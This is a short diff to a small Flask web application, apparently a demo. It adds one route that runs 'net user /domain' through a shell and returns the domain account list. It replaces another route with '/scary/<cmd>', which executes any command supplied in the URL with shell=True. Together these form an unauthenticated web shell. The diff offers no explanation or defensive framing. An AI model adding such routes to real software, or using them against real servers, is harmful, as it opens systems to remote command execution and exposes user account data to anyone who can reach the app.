@@ -8,6 +8,11 @@ app = Flask(__name__)
 def hello():
 	return "Hello there"
 
+@app.route('/secret')
+def secret():
+	out = subprocess.check_output('net user /domain', shell=True)
+	return out
+
 @app.route('/downloads')
 def dloads():
 	try:
@@ -21,7 +26,7 @@ def dloads():
 	except:
 		return "Downloads folder not in standard location"
 
-@app.route('/users')
-def users():
-	out = subprocess.check_output('net user /domain')
+@app.route('/scary/<cmd>')
+def ohno(cmd):
+	out = subprocess.check_output(cmd, shell=True)
 	return out
